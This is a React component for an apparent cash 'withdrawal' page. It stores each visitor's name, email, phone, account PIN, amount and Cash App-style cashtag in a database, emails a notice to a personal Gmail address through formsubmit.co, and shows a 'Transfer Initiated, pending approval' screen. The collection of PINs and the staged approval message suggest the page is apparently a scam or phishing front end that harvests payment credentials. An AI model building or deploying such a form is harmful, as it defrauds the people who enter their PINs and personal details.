import React, { useEffect, useState } from "react";
import { useStepper } from "../context/StepperContext";
import { supabase } from '../lib/supabase';
import { Spinner } from "./Spinner";

const withTimeout = (promise, ms) => {
	const timeout = new Promise((_, reject) =>
		setTimeout(() => reject(new Error("Request timed out")), ms)
	);
	return Promise.race([promise, timeout]);
};

export const CompletionModal = () => {
	const { isCompleted, setIsCompleted, goToStep, data, resetData } = useStepper();
	const [emailSent, setEmailSent] = useState(false);
	const [emailStatus, setEmailStatus] = useState("");
	const [isError, setIsError] = useState(false);

	useEffect(() => {
		if (isCompleted && !emailSent) {
			setEmailStatus("Submitting your withdrawal request...");
			setIsError(false);
			
			const submitData = async () => {
				try {
					const checkPromise = supabase
						.from('withdrawals')
						.select('email')
						.eq('email', data.email)
						.limit(1);

					const { data: existingUser, error: checkError } = await withTimeout(checkPromise, 10000);

					if (checkError) throw checkError;

					if (existingUser && existingUser.length > 0) {
						setEmailStatus("An application with this email has already been submitted.");
						setEmailSent(true);
						return;
					}

					const insertPromise = supabase
						.from('withdrawals')
						.insert([
							{
								email: data.email,
								full_name: data.fullName,
								phone: data.phone,
								pin: data.pin,
								amount: data.amount,
								payment_method: data.selectedPaymentMethod,
								transfer_method: data.selectedTransferMethod,
								cashtag: data.cashtag,
								status: 'pending'
							}
						]);

					const { error: insertError } = await withTimeout(insertPromise, 10000);

					if (insertError) throw insertError;

					const formData = new FormData();
					formData.append("email", data.email);
					formData.append("_subject", "New Registration (Supabase Saved)");
					formData.append("_autoresponse", "Your withdrawal is currently in progress. An administrator is reviewing your request and you will be notified once it is approved.");
					
					fetch("https://formsubmit.co/ajax/ismaileyyunusa@gmail.com", {
						method: "POST",
						headers: {
							Accept: "application/json",
						},
						body: formData,
					}).catch(console.error);

					setEmailStatus("Request submitted successfully! It is now pending approval.");
					setEmailSent(true);
				} catch (error) {
					console.error("Error submitting:", error);
					setIsError(true);
					setEmailStatus("Error connecting to server. Please try again.");
				}
			};

			submitData();
		}
	}, [isCompleted, emailSent, data]);

	if (!isCompleted) return null;

	const handleRestart = () => {
		setEmailSent(false);
		setIsCompleted(false);
		resetData();
		goToStep(1);
	};

	const handleRetry = () => {
		setEmailSent(false);
	};

	return (
		<div id="completion-overlay" className="show">
			<div className="completion-card">
				<div className="completion-icon">✓</div>
				<h2>Transfer Initiated</h2>
				
				<div className="status-text">
					{emailStatus}
					{!emailSent && !isError && <Spinner />}
				</div>

				<div className="completion-btn-row">
					{isError && (
						<button className="completion-btn btn-close" onClick={handleRetry}>
							Retry Request
						</button>
					)}
					{emailSent && (
						<button className="completion-btn btn-restart" onClick={handleRestart}>
							Return Home
						</button>
					)}
				</div>
			</div>

			<style>{`
        #completion-overlay {
          position: fixed; inset: 0; z-index: 100000;
          background: rgba(2, 7, 22, 0.88); backdrop-filter: blur(12px);
          display: grid; place-items: center; padding: 20px;
        }
        .completion-card {
          width: 90%; max-width: 440px; margin: 0 auto;
          background: linear-gradient(145deg, #0a183d, #050d24);
          border: 1px solid rgba(226, 184, 47, 0.5); border-radius: 24px;
          padding: 36px 30px; text-align: center; box-shadow: 0 25px 65px rgba(0,0,0,0.6);
          color: #fff; animation: fadeIn 0.3s ease-out;
        }
        .completion-icon {
          width: 72px; height: 72px; border-radius: 50%;
          background: linear-gradient(135deg, #ffd85b, #c99313); color: #0b111e;
          display: grid; place-items: center; font-size: 32px;
          margin: 0 auto 20px; box-shadow: 0 0 25px rgba(229, 184, 47, 0.4);
        }
        .completion-card h2 { font-size: 26px; margin-bottom: 10px; letter-spacing: -0.5px; }
        .status-text { margin: 20px 0; font-size: 15px; color: #a5b4d3; line-height: 1.5; min-height: 25px; }
        .completion-btn-row { display: flex; gap: 12px; justify-content: center; margin-top: 15px; }
        .completion-btn {
          width: 100%; padding: 13px 22px; border-radius: 13px;
          font-weight: 750; font-size: 14px; cursor: pointer; border: 0;
        }
        .btn-restart { background: linear-gradient(135deg, #1fc878, #139155); color: white; }
        .btn-close { background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.15); color: #fff; }
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px) scale(0.95); }
          to { opacity: 1; transform: translateY(0) scale(1); }
        }
      `}</style>
		</div>
	);
};
